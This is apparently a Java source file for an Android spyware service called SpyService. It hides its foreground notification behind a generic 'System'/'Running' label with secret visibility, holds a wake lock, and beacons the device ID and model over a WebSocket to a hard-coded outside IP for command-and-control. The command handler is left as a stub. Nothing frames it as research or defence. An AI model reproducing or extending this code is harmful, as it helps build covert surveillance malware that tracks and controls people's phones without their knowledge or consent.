package com.system.phantom;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;

import com.squareup.okhttp3.OkHttpClient;
import com.squareup.okhttp3.Request;
import com.squareup.okhttp3.WebSocket;
import com.squareup.okhttp3.WebSocketListener;

import java.util.concurrent.TimeUnit;

public class SpyService extends Service {
    private static final String WS_URL = "ws://100.110.145.108:5000/ws?device_id=";
    private OkHttpClient client;
    private WebSocket webSocket;
    private Handler handler = new Handler();
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PhantomLock");
        wakeLock.acquire(10 * 60 * 1000L);
        startForeground(9999, createNotification());
        initWebSocket();
    }

    private void initWebSocket() {
        client = new OkHttpClient.Builder().pingInterval(10, TimeUnit.SECONDS).build();
        Request request = new Request.Builder().url(WS_URL + deviceId).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, okhttp3.Response response) {
                webSocket.send("REGISTER|" + deviceId + "|" + Build.MODEL);
            }
            @Override
            public void onMessage(WebSocket webSocket, String text) {
                // Handle commands nanti
            }
            @Override
            public void onFailure(WebSocket webSocket, Throwable t, okhttp3.Response response) {
                handler.postDelayed(() -> initWebSocket(), 5000);
            }
        });
    }

    private Notification createNotification() {
        String channelId = "phantom_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }
        return new Notification.Builder(this, channelId)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webSocket != null) webSocket.close(1000, "Service stopped");
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
